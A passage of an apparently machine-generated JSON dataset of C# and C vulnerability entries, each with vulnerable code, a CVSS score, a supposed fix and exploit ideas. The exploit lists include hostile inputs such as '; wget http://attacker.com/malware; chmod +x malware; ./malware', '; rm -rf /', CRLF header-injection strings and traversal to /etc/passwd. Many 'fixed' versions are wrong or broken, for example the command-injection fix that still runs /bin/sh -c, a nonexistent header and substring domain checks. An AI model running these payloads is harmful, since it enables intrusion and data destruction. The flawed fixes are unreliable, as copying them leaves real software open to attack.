            "In a more complex system, this could lead to race conditions affecting critical data integrity."
        ]
    },
    "c#_33": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "using System; using System.Web.Security; public class UserSessionManager { private static readonly string[] validUsernames = { \"admin\", \"user1\", \"user2\" }; public void Authenticate(string username, string sessionToken) { if (Array.Exists(validUsernames, element => element == username)) { FormsAuthentication.SetAuthCookie(username, false); } else { throw new Exception(\"Invalid username\"); } } public bool ValidateSession(string sessionToken) { var ticket = FormsAuthentication.Decrypt(sessionToken); return ticket != null && ticket.Expired == false; } }",
        "cvss_score": 3.1,
        "fixed_code": "using System; using System.Web.Security; using System.Web; public class UserSessionManager { private static readonly string[] validUsernames = { \"admin\", \"user1\", \"user2\" }; public void Authenticate(string username, HttpContext context) { if (Array.Exists(validUsernames, element => element == username)) { FormsAuthentication.SetAuthCookie(username, false); } else { throw new Exception(\"Invalid username\"); } HttpCookie authCookie = context.Request.Cookies[FormsAuthentication.FormsCookieName]; if (authCookie != null) { authCookie.HttpOnly = true; authCookie.Secure = true; } } public bool ValidateSession(string sessionToken) { var ticket = FormsAuthentication.Decrypt(sessionToken); return ticket != null && !ticket.Expired; } }",
        "exploit_ways": [
            "An attacker can use a pre-known session token to hijack a legitimate user's session.",
            "They could create a malicious link with the fixed session token to trick users into clicking it, leading to unauthorized access.",
            "If the session token is predictable or reused across sessions, attackers might guess and exploit it to gain unauthorized access."
        ]
    },
    "c#_34": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "public void LoadExternalContent(string url)\n{\n    webBrowser1.Navigate(url);\n}",
        "cvss_score": 4.2,
        "fixed_code": "public void LoadExternalContent(string url)\n{\n    if (IsValidUrl(url))\n    {\n        webBrowser1.Navigate(url);\n    }\n}\n\nprivate bool IsValidUrl(string url)\n{\n    Uri uri;\n    return Uri.TryCreate(url, UriKind.Absolute, out uri) && (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps);\n}",
        "exploit_ways": [
            "An attacker could navigate the user to a malicious URL that overlays a fake UI over legitimate content.",
            "Users might be tricked into clicking buttons or links on an invisible iframe overlay, leading to unintended actions.",
            "Malicious content can steal session cookies or perform actions under the user's credentials by manipulating the visible web page."
        ]
    },
    "c#_35": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "using System;\nusing System.IO;\nclass Program {\n    static void Main(string[] args) {\n        string filePath = @\"C:\\\\path\\\\to\\\\sensitivefile.txt\";\n        if (File.Exists(filePath)) {\n            string content = File.ReadAllText(filePath);\n            Console.WriteLine(content);\n        } else {\n            Console.WriteLine(\"File not found.\");\n        }\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System;\nusing System.IO;\nclass Program {\n    static void Main(string[] args) {\n        string filePath = @\"C:\\\\path\\\\to\\\\sensitivefile.txt\";\n        try {\n            string content = File.ReadAllText(filePath);\n            Console.WriteLine(\"File read successfully.\");\n        } catch (Exception ex) {\n            Console.WriteLine(\"An error occurred: \" + ex.Message);\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker with access to the system could read sensitive information by running the program.",
            "If the file path is predictable, an attacker could place a malicious file at that location to be disclosed.",
            "Logging errors can reveal the existence of sensitive files through exception messages."
        ]
    },
    "c#_36": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class UrlHandler : IHttpHandler {\n    public void ProcessRequest(HttpContext context) {\n        string redirectUrl = context.Request.QueryString[\"url\"];\n        if (IsValidRedirect(redirectUrl)) {\n            context.Response.Redirect(redirectUrl);\n        } else {\n            context.Response.Write(\"Invalid URL\");\n        }\n    }\n    private bool IsValidRedirect(string url) {\n        // Very complex validation logic that is hard to bypass\n        return true;\n    }\n    public bool IsReusable => false;\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class UrlHandler : IHttpHandler {\n    private static readonly string[] allowedDomains = { \"example.com\", \"sub.example.com\" };\n\n    public void ProcessRequest(HttpContext context) {\n        string redirectUrl = context.Request.QueryString[\"url\"];\n        if (IsValidRedirect(redirectUrl)) {\n            context.Response.Redirect(redirectUrl);\n        } else {\n            context.Response.Write(\"Invalid URL\");\n        }\n    }\n\n    private bool IsValidRedirect(string url) {\n        var uri = new Uri(url);\n        return Array.Exists(allowedDomains, d => uri.Host.EndsWith(d));\n    }\n\n    public bool IsReusable => false;\n}",
        "exploit_ways": [
            "An attacker can redirect users to a phishing site by providing a malicious URL.",
            "They could use the vulnerability to perform cross-site scripting (XSS) attacks if combined with other vulnerabilities.",
            "By crafting specific URLs, attackers might exploit this to launch social engineering campaigns."
        ]
    },
    "c#_37": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "using System.Web.UI;\n\npublic partial class DefaultPage : Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        string iframe = \"<iframe src=\\\"https://malicious.example.com/\\\" style=\\\"opacity:0;position:absolute;z-index:9999;\\\"></iframe>\";\n        ClientScript.RegisterStartupScript(this.GetType(), \\\"iframe\\\", iframe, false);\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System.Web.UI;\n\npublic partial class DefaultPage : Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        Response.Headers.Add(\"X-Frame-Options\", \"SAMEORIGIN\");\n    }\n}",
        "exploit_ways": [
            "An attacker can host a malicious website that embeds the target site in an iframe to trick users into clicking on unintended elements.",
            "Attackers could use social engineering tactics, convincing users to visit a crafted page that performs actions on their behalf without their knowledge.",
            "By exploiting clickjacking, attackers can manipulate user interactions to perform unauthorized actions like form submissions or button clicks."
        ]
    },
    "c#_38": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "using System;\nusing System.IO;\nclass FileReader {\n    public void ReadFile(string filePath) {\n        if (filePath.Contains(\"..\")) {\n            throw new ArgumentException(\\\"Invalid file path\\\");\n        }\n        string content = File.ReadAllText(filePath);\n        Console.WriteLine(content);\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "using System;\nusing System.IO;\nclass FileReader {\n    public void ReadFile(string filePath) {\n        string safePath = Path.GetFullPath(filePath);\n        if (!safePath.StartsWith(Path.GetFullPath(\"./allowed_directory\"))) {\n            throw new ArgumentException(\\\"Invalid file path\\\");\n        }\n        string content = File.ReadAllText(safePath);\n        Console.WriteLine(content);\n    }\n}",
        "exploit_ways": [
            "An attacker can use a relative path to include unauthorized files, such as 'path/to/file.txt'.",
            "They could attempt to exploit null byte injection if not properly handled by using 'file.php%00/etc/passwd'.",
            "Crafting paths with URL encoding like '%2e%2e/' might bypass simple checks in some environments."
        ]
    },
    "c#_39": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class RedirectHandler : IHttpHandler {\n    public void ProcessRequest(HttpContext context) {\n        string url = context.Request.QueryString[\"url\"];\n        if (url != null) {\n            context.Response.Redirect(url);\n        }\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class RedirectHandler : IHttpHandler {\n    private static readonly string[] allowedDomains = { \"example.com\", \"safeurl.com\" };\n    public void ProcessRequest(HttpContext context) {\n        string url = context.Request.QueryString[\"url\"];\n        if (url != null && IsAllowedUrl(url)) {\n            context.Response.Redirect(url);\n        }\n    }\n\n    private bool IsAllowedUrl(string url) {\n        foreach (var domain in allowedDomains) {\n            if (Uri.IsWellFormedUriString(url, UriKind.Absolute) && new Uri(url).Host.EndsWith(domain)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by appending '?url=http://malicious.com' to the URL.",
            "They could exploit this vulnerability to perform phishing attacks by redirecting to fake login pages.",
            "Attackers might use it to spread malware by redirecting users to sites hosting malicious downloads."
        ]
    },
    "c#_40": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "using System.Security.Permissions;\npublic class ClickjackableFrame\n{\n    [PermissionSet(SecurityAction.Demand, Name = \"FullTrust\")]\n    public void DisplayFrame(string url)\n    {\n        System.Windows.Forms.WebBrowser browser = new System.Windows.Forms.WebBrowser();\n        browser.Navigate(url);\n        browser.Dock = System.Windows.Forms.DockStyle.Fill;\n        System.Windows.Forms.Form form = new System.Windows.Forms.Form();\n        form.Controls.Add(browser);\n        form.ShowDialog();\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System.Security.Permissions;\npublic class SecureFrame\n{\n    [PermissionSet(SecurityAction.Demand, Name = \"FullTrust\")]\n    public void DisplayFrame(string url)\n    {\n        if (!IsTrustedUrl(url))\n            throw new Exception(\"Untrusted URL\");\n        System.Windows.Forms.WebBrowser browser = new System.Windows.Forms.WebBrowser();\n        browser.Navigate(url);\n        browser.Dock = System.Windows.Forms.DockStyle.Fill;\n        System.Windows.Forms.Form form = new System.Windows.Forms.Form();\n        form.Controls.Add(browser);\n        form.ShowDialog();\n    }\n\n    private bool IsTrustedUrl(string url)\n    {\n        // Implement URL validation logic here\n        return url.StartsWith(\"https://trusted.example.com/\");\n    }\n}",
        "exploit_ways": [
            "An attacker could frame a malicious site that tricks users into clicking buttons on the trusted page.",
            "Attackers can host phishing content in an iframe and overlay it with transparent elements from the legitimate site.",
            "Malicious sites can force users to perform actions like login or data submission without their knowledge."
        ]
    },
    "c#_41": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class HttpResponseSplitter {\n    public void DisplayUserInput(HttpContext context) {\n        string userInput = context.Request.QueryString[\"userInput\"];\n        context.Response.Write(\"<html><body>\");\n        context.Response.Write(userInput);\n        context.Response.Write(\\\"</body></html>\\\");\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class HttpResponseSplitter {\n    public void DisplayUserInput(HttpContext context) {\n        string userInput = HttpUtility.HtmlEncode(context.Request.QueryString[\"userInput\"]);\n        context.Response.Write(\"<html><body>\");\n        context.Response.Write(userInput);\n        context.Response.Write(\\\"</body></html>\\\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input '%0d%0aSet-Cookie: evilCookie=evilValue' to inject malicious cookies.",
            "Using '%0d%0aContent-Length: 1000%0d%0aContent-Type: text/html' to alter response headers.",
            "Injecting JavaScript via '%3Cscript%3Ealert(%27XSS%27)%3C/script%3E' can lead to reflected XSS if not properly handled."
        ]
    },
    "c#_42": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "using System;\npublic class Program {\n    public static void Main(string[] args) {\n        Console.WriteLine(\"Enter your username:\");\n        string username = Console.ReadLine();\n        Console.WriteLine(\"Username entered: \" + username);\n    }\n}",
        "cvss_score": 2.5,
        "fixed_code": "using System;\npublic class Program {\n    public static void Main(string[] args) {\n        Console.WriteLine(\"Enter your username:\");\n        string username = Console.ReadLine();\n        // Do not echo back the username for security reasons\n    }\n}",
        "exploit_ways": [
            "An attacker could observe the console output to discover usernames.",
            "In a logging environment, logged data might expose sensitive user input.",
            "If part of a larger application, this could lead to more detailed information leakage."
        ]
    },
    "c#_43": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "using System;\\nusing System.Web;\\npublic class RedirectHandler : IHttpHandler {\\n    public void ProcessRequest(HttpContext context) {\\n        string url = context.Request.QueryString[\"url\"];\n        if (url != null) {\\n            context.Response.Redirect(url);\\n        }\\n    }\\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\\nusing System.Web;\\npublic class RedirectHandler : IHttpHandler {\\n    private static readonly string[] allowedDomains = { \"example.com\", \"sub.example.com\" };\\n    public void ProcessRequest(HttpContext context) {\\n        string url = context.Request.QueryString[\"url\"];\n        if (url != null && IsAllowedUrl(url)) {\\n            context.Response.Redirect(url);\\n        } else {\\n            context.Response.StatusCode = 400;\\n        }\\n    }\\n    private bool IsAllowedUrl(string url) {\\n        foreach (var domain in allowedDomains) {\\n            if (url.Contains(domain)) return true;\\n        }\\n        return false;\\n    }\\n}",
        "exploit_ways": [
            "An attacker could redirect users to a malicious site, e.g., http://attacker.com/malicious",
            "They can use the open redirect to phish for credentials by redirecting to a fake login page.",
            "Crafted URLs with JavaScript payloads could be used to execute code in the context of the victim's browser."
        ]
    },
    "c#_44": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\npublic class HttpResponseSplitter {\n    public void SendResponse(string userInput) {\n        string response = $\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n{userInput}\\r\\n<html><body>Hello</body></html>\";\n        Console.WriteLine(response);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "using System;\npublic class HttpResponseSplitter {\n    public void SendResponse(string userInput) {\n        string sanitizedInput = userInput.Replace(\"\\r\", \"\").Replace(\"\\n\", \"\");\n        string response = $\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n{sanitizedInput}\\r\\n<html><body>Hello</body></html>\";\n        Console.WriteLine(response);\n    }\n}",
        "exploit_ways": [
            "An attacker could inject '\\r\\nSet-Cookie: exploit=true' to set a malicious cookie.",
            "They can insert '\\r\\nLocation: http://attacker.com' to redirect users to a malicious site.",
            "Using '\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Exploit</body></html>' to inject an additional response."
        ]
    },
    "c#_45": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class UserProfile\n{\n    public void SetUserCookie(string userName)\n    {\n        string cookieValue = HttpUtility.UrlEncode(userName);\n        HttpContext.Current.Response.Cookies[\"user\"].Value = cookieValue;\n    }\n}",
        "cvss_score": 5.4,
        "fixed_code": "using System;\nusing System.Web;\npublic class UserProfile\n{\n    public void SetUserCookie(string userName)\n    {\n        string cookieValue = HttpUtility.UrlPathEncode(userName);\n        HttpContext.Current.Response.Cookies[\"user\"].Value = cookieValue;\n    }\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: admin=true' to set an additional malicious cookie.",
            "Could use '\\r\\nContent-Length: 0\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nContent-Length: 38\\r\\n\\r\\n<html><body>Malicious Content</body></html>' to inject a secondary HTTP response.",
            "Injecting '\\r\\nLocation: http://malicious.com' can redirect users to an attacker-controlled site."
        ]
    },
    "c#_46": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "using System;\\nclass Program {\\n    static int sharedResource = 0;\\n    static void Main() {\\n        var t1 = new System.Threading.Thread(Increment);\\n        var t2 = new System.Threading.Thread(Increment);\\n        t1.Start();\\n        t2.Start();\\n        t1.Join();\\n        t2.Join();\\n        Console.WriteLine(sharedResource);\\n    }\\n    static void Increment() {\\n        for (int i = 0; i < 1000; i++) {\\n            sharedResource++;\\n        }\\n    }\\n}",
        "cvss_score": 4.2,
        "fixed_code": "using System;\\nclass Program {\\n    static int sharedResource = 0;\\n    static readonly object lockObject = new object();\\n    static void Main() {\\n        var t1 = new System.Threading.Thread(Increment);\\n        var t2 = new System.Threading.Thread(Increment);\\n        t1.Start();\\n        t2.Start();\\n        t1.Join();\\n        t2.Join();\\n        Console.WriteLine(sharedResource);\\n    }\\n    static void Increment() {\\n        for (int i = 0; i < 1000; i++) {\\n            lock (lockObject) {\\n                sharedResource++;\\n            }\\n        }\\n    }\\n}",
        "exploit_ways": [
            "An attacker could run the program multiple times to observe inconsistent results due to race conditions.",
            "By carefully controlling thread execution timing, an attacker might force the shared resource to have unexpected values.",
            "In a larger application, this flaw could lead to data corruption or security vulnerabilities in concurrent operations."
        ]
    },
    "c#_47": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "using System;\nusing System.Web.Security;\nclass Program {\n    static void Main(string[] args) {\n        FormsAuthentication.SetAuthCookie(\"user\", false);\n        Console.WriteLine(FormsAuthentication.GetAuthCookie(\"user\", false).Value);\n    }\n}",
        "cvss_score": 2.5,
        "fixed_code": "using System;\nusing System.Web.Security;\nclass Program {\n    static void Main(string[] args) {\n        string newSessionId = Guid.NewGuid().ToString();\n        FormsAuthentication.SetAuthCookie(\"user\", false);\n        HttpCookie authCookie = FormsAuthentication.GetAuthCookie(\"user\", false);\n        authCookie.Value = newSessionId;\n        Console.WriteLine(authCookie.Value);\n    }\n}",
        "exploit_ways": [
            "An attacker could predict or obtain a session ID and use it to hijack the user's session.",
            "By fixing the session ID, an attacker can reuse the same session across different devices or browsers without logging in again.",
            "The vulnerability allows attackers to maintain persistent access by using the fixed session ID."
        ]
    },
    "c#_48": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "using System;\nusing System.Web;\npublic class RedirectController : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        string url = Request.QueryString[\"url\"];\n        if (url != null)\n        {\n            Response.Redirect(url);\n        }\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "using System;\nusing System.Web;\npublic class RedirectController : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        string url = Request.QueryString[\"url\"];\n        string[] allowedUrls = { \"https://example.com/\", \"https://anotherdomain.com/\" };\n        if (url != null && Array.Exists(allowedUrls, s => s == url))\n        {\n            Response.Redirect(url);\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing a URL like \"https://malicious.com\" as the query parameter.",
            "They could use this vulnerability to phishing attacks by redirecting users to fake login pages that resemble legitimate ones.",
            "Attackers might also exploit it for session fixation attacks by redirecting users to URLs with known session tokens."
        ]
    },
    "c#_49": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "public void SlowFunction() {\n    while (true) {\n        for (int i = 0; i < int.MaxValue; i++) {\n            // Simulate a time-consuming operation\n            double result = Math.Sqrt(i);\n        }\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "public void SlowFunction() {\n    while (true) {\n        for (int i = 0; i < 1000000; i++) { // Limit the loop iterations\n            // Simulate a time-consuming operation\n            double result = Math.Sqrt(i);\n        }\n        Thread.Sleep(1000); // Sleep to prevent high CPU usage\n    }\n}",
        "exploit_ways": [
            "An attacker can trigger this function, causing high CPU usage and making the system unresponsive.",
            "If part of a web service, it can be exploited to cause DoS on other legitimate users by exhausting server resources.",
            "In a multi-threaded environment, multiple invocations can lead to resource exhaustion and system crash."
        ]
    },
    "c_0": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "#include <stdio.h>\\n#include <stdlib.h>\\n\\nvoid escalate_privileges() {\\n    system(\"sudo -u root whoami\");\\n}\\n\\nint main() {\\n    escalate_privileges();\\n    return 0;\\n}",
        "cvss_score": 8.2,
        "fixed_code": "#include <stdio.h>\\n#include <stdlib.h>\\n\\nvoid escalate_privileges() {\\n    // Privilege escalation is not allowed here\\n}\\n\\nint main() {\\n    printf(\"This program does not escalate privileges.\");\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can modify the sudoers file to allow executing commands without a password.",
            "Exploiting vulnerabilities in the 'sudo' binary or its configuration files could allow privilege escalation.",
            "If the program is scheduled to run with cron, an attacker might modify the crontab entry to execute malicious code."
        ]
    },
    "c_1": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid process_request(char *request) {\n    char buffer[1024];\n    snprintf(buffer, sizeof(buffer), \"http://example.com/set?value=%s\", request);\n    printf(\"Redirecting to: %s\\n\", buffer);\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid process_request(char *request, char *csrf_token) {\n    char buffer[1024];\n    snprintf(buffer, sizeof(buffer), \"http://example.com/set?value=%s&token=%s\", request, csrf_token);\n    printf(\"Redirecting to: %s\\n\", buffer);\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link that users click on, tricking them into changing settings without their knowledge.",
            "Using a CSRF token mismatch attack, an attacker sends requests with invalid tokens to bypass the protection mechanism.",
            "Embedding malicious scripts in web pages visited by the victim can automatically send forged requests to perform actions."
        ]
    },
    "c_2": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_request(char* user_id, char* action) {\n    printf(\"Sending request to perform %s on user %s\\n\", action, user_id);\n}\n\nint main() {\n    char user_input[100];\n    printf(\"Enter user ID: \");\n    fgets(user_input, sizeof(user_input), stdin);\n    send_request(user_input, \"transfer_funds\");\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string_t>\n\nvoid send_request(char* user_id, char* action, char* token) {\n    printf(\"Sending request with token %s to perform %s on user %s\\n\", token, action, user_id);\n}\n\nint main() {\n    char user_input[100];\n    char token[] = \"secure_random_token_here\";\n    printf(\"Enter user ID: \");\n    fgets(user_input, sizeof(user_input), stdin);\n    send_request(user_input, \"transfer_funds\", token);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could trick a logged-in admin to visit a malicious website that sends a request to perform an action on their behalf.",
            "Crafting links in emails or forums with the target URL can automatically execute actions when clicked by a victim if they are authenticated.",
            "Using social engineering, attackers may convince users to submit forms unknowingly, performing actions like transferring funds without user consent."
        ]
    },
    "c_3": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid deserialize(char *data) {\n    int (*func_ptr)();\n    memcpy(&func_ptr, data + 4, sizeof(func_ptr));\n    func_ptr();\n}\n\nint main() {\n    char buffer[1024];\n    printf(\"Enter serialized data: \");\n    fgets(buffer, sizeof(buffer), stdin);\n    deserialize(buffer);\n    return 0;\n}",
        "cvss_score": 9.0,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid safe_deserialize(char *data) {\n    // Assuming data should only be specific valid commands or values\n    if (strncmp(data, \"valid_command\", 13) == 0) {\n        printf(\"Executing valid command.\\n\");\n    } else {\n        printf(\"Invalid input.\\n\");\n    }\n}\n\nint main() {\n    char buffer[1024];\n    printf(\"Enter serialized data: \");\n    fgets(buffer, sizeof(buffer), stdin);\n    safe_deserialize(buffer);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject a pointer to malicious code in the serialized data to execute arbitrary commands.",
            "By carefully crafting the input data, an attacker could cause a buffer overflow leading to remote code execution.",
            "The vulnerability can be exploited to perform return-oriented programming (ROP) attacks by redirecting control flow."
        ]
    },
    "c_4": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\\n#include <stdlib.h>\\nvoid insecure_deserialize(char *data) {\\n    int (*func_ptr)();\\n    sscanf(data, \"%p\", (void**)&func_ptr);\\n    func_ptr();\\n}",
        "cvss_score": 7.2,
        "fixed_code": "#include <stdio.h>\\n#include <stdlib.h>\\nvoid secure_deserialize(char *data) {\\n    // Example of a safe function that does not use insecure deserialization\\n    printf(\"Data received: %s\", data);\\n}",
        "exploit_ways": [
            "An attacker could provide a pointer to a malicious function, leading to arbitrary code execution.",
            "Crafting specific memory addresses in the input could lead to overwriting important program variables or memory sections.",
            "Using format string vulnerabilities in sscanf could potentially leak sensitive data from the stack."
        ]
    },
    "c_5": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nstruct Data {\n    char *content;\n};\n\nvoid deserialize(struct Data **obj, const char *str) {\n    *obj = (struct Data *)malloc(sizeof(struct Data));\n    (*obj)->content = strdup(str);\n}\n\nint main() {\n    struct Data *data;\n    deserialize(&data, \"malicious_data_here\\nmore_malicious_code\");\n    printf(\"Deserialized data: %s\\n\", data->content);\n    free(data->content);\n    free(data);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nstruct Data {\n    char *content;\n};\n\nvoid deserialize(struct Data **obj, const char *str) {\n    if (strlen(str) > 1024) { // Example validation step\n        fprintf(stderr, \"Input too long\\n\");\n        exit(EXIT_FAILURE);\n    }\n    *obj = (struct Data *)malloc(sizeof(struct Data));\n    (*obj)->content = strdup(str);\n}\n\nint main() {\n    struct Data *data;\n    deserialize(&data, \"safe_data_here\");\n    printf(\"Deserialized data: %s\\n\", data->content);\n    free(data->content);\n    free(data);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could inject malicious content that overflows the expected input length, leading to a buffer overflow.",
            "If the deserialized data is used in further operations without validation, it could lead to code execution if crafted carefully.",
            "By injecting specially formatted strings, an attacker might be able to manipulate the program's behavior or leak sensitive information."
        ]
    },
    "c_6": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\nclass Executor {\npublic:\n    void runCommand(const char* cmd) {\n        system(cmd);\n    }\n};",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\nclass Executor {\npublic:\n    void runCommand(const char* cmd) {\n        // Use execvp with argument vector to avoid shell injection\n        const char* args[] = {\"/bin/sh\", \"-c\", cmd, nullptr};\n        execvp(\"/bin/sh\", (char* const*)args);\n    }\n};",
        "exploit_ways": [
            "An attacker could input 'echo vulnerable > /tmp/test' to create a file indicating the system is compromised.",
            "Using '; rm -rf /' could delete all files on the system.",
            "Chaining commands with '; wget http://attacker.com/malware; chmod +x malware; ./malware' could install and execute malicious software."
        ]
    },
    "c_7": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nstruct User {\n    char *name;\n    int age;\n};\n\nvoid deserialize_user(struct User *user, const char *data) {\n    user->name = strdup(data);\n}\n\nint main() {\n    struct User user;\n    deserialize_user(&user, \"John Doe; rm -rf /\");\n    printf(\"User name: %s\\n\", user.name);\n    free(user.name);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nstruct User {\n    char *name;\n    int age;\n};\n\nvoid deserialize_user(struct User *user, const char *data) {\n    size_t length = strcspn(data, \";\");\n    user->name = (char *)malloc(length + 1);\n    strncpy(user->name, data, length);\n    user->name[length] = '\\0';\n}\n\nint main() {\n    struct User user;\n    deserialize_user(&user, \"John Doe; rm -rf /\");\n    printf(\"User name: %s\\n\", user.name);\n    free(user.name);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject malicious commands into the deserialized data to be executed in the context of the vulnerable application.",
            "By crafting a payload with specific control characters, an attacker might manipulate the behavior of the program to access unauthorized resources or perform unintended actions.",
            "The vulnerability can potentially lead to arbitrary code execution if combined with other vulnerabilities that allow for command injection."
        ]
    },
    "c_8": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    char filename[256];\n    printf(\"Enter file name to read: \");\n    scanf(\"%s\", filename);\n    FILE *file = fopen(filename, \"r\");\n    if (file) {\n        fclose(file);\n        printf(\"File opened successfully.\\n\");\n    } else {\n        printf(\"Failed to open file.\\n\");\n    }\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define SAFE_DIR \"/safe_dir/\"\n\nint main() {\n    char filename[256];\n    char safe_path[256];\n    printf(\"Enter file name to read: \");\n    scanf(\"%s\", filename);\n    snprintf(safe_path, sizeof(safe_path), \"%s%s\", SAFE_DIR, filename);\n    FILE *file = fopen(safe_path, \"r\");\n    if (file) {\n        fclose(file);\n        printf(\"File opened successfully.\\n\");\n    } else {\n        printf(\"Failed to open file.\\n\");\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can input \"../etc/passwd\" to read sensitive system files.",
            "They could use \"../../var/log/auth.log\" to access authentication logs.",
            "Inputting \"../../../../flag.txt\" might allow retrieval of a secret flag file."
        ]
    },
    "c_9": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "#include <stdio.h>\\n#include <string.h>\\n\\nint authenticate(char *password) {\\n    char secret[16];\\n    strcpy(secret, \"s3cr3tP@ssw0rd!\");\\n    return strcmp(password, secret) == 0;\\n}\\n\\nint main() {\\n    char pass[256];\\n    printf(\"Enter password: \");\\n    scanf(\"%s\", pass);\\n    if (authenticate(pass)) {\\n        printf(\"Access granted!\\n\");\\n    } else {\\n        printf(\"Access denied!\\n\");\\n    }\\n    return 0;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\n#include <stdlib.h>\\n\\n#define PASSWORD \"s3cr3tP@ssw0rd!\"\\n\\nint authenticate(const char *password) {\\n    return strcmp(password, PASSWORD) == 0;\\n}\\n\\nint main() {\\n    char pass[256];\\n    printf(\"Enter password: \");\\n    if (fgets(pass, sizeof(pass), stdin)) {\\n        size_t len = strlen(pass);\\n        if (len > 0 && pass[len - 1] == '\\n') {\\n            pass[len - 1] = '\\0';\\n        }\\n    }\\n    if (authenticate(pass)) {\\n        printf(\"Access granted!\\n\");\\n    } else {\\n        printf(\"Access denied!\\n\");\\n    }\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can use brute force to guess the password.",
            "Using a buffer overflow, an attacker might be able to exploit the fixed-size array vulnerability.",
            "If compiled on a system with predictable memory layout, an attacker might try to bypass authentication by injecting specific input."
        ]
    },
    "c_10": {
        "vulnerability_type": "Buffer Overflow",
